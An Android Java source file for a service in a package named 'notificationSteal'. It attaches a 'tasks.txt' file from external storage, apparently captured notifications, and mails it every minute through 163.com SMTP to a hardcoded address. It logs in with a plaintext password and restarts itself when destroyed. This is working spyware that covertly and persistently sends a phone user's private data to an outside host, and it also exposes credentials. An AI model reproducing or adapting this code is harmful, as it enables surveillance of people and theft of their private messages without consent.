package com.tomridder.notificationSteal;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import java.io.File;

import javax.mail.MessagingException;
import javax.mail.internet.AddressException;

public class SendMailService extends Service {


    private Restart restart;

    private final static String path1= Environment.getExternalStorageDirectory().toString()+ File.separator+"tasks.txt";

    public SendMailService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        restart=new Restart();
        IntentFilter intentFilter=new IntentFilter();
        intentFilter.addAction("Restart");
        registerReceiver(restart,intentFilter);

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        sendEmail();
        AlarmManager manager=(AlarmManager)getSystemService(ALARM_SERVICE);
        int time=1000*60;
        long triggerAtTime= SystemClock.elapsedRealtime()+time;
        Intent i=new Intent(this,SendMailService.class);
        PendingIntent pi=PendingIntent.getService(this,0,i,0);
        //manager.cancel(pi);
        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,triggerAtTime,pi);
        return super.onStartCommand(intent,flags,startId);
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        Intent intent=new Intent();
        intent.setAction("Restart");
        sendBroadcast(intent);
    }

    public  void sendEmail()
    {

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    EmailSender sender = new EmailSender();
                    //设置服务器地址和端口，可以查询网络
                    sender.setProperties("smtp.163.com", "25");
                    //分别设置发件人，邮件标题和文本内容
                    sender.setMessage("tomridder716@163.com", " 你好" + "-" ,
                            "通知内容请见附件");
                    //设置收件人
                    sender.setReceiver(new String[]{"tomridder716@163.com"});
                    //添加附件换成你手机里正确的路径
                    sender.addAttachment(path1);
                    //发送邮件
                    //sender.setMessage"&#x4f60;&#x7684;163&#x90ae;&#x7bb1;&#x8d26;&#x53f7;", "EmailS//ender", "Java Mail &#xff01;");&#x8fd9;&#x91cc;&#x9762;&#x4e24;&#x4e2a;&#x90ae;&#x7bb1;&#x8d26;&#x53f7;&#x8981;&#x4e00;&#x81f4;
                    sender.sendEmail("smtp.163.com", "tomridder716@163.com", "1995521gcywasdqq");
                } catch (AddressException e) {
                    e.printStackTrace();
                } catch (MessagingException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        Log.i("MainActivityMTS","send email tried");
    }
}
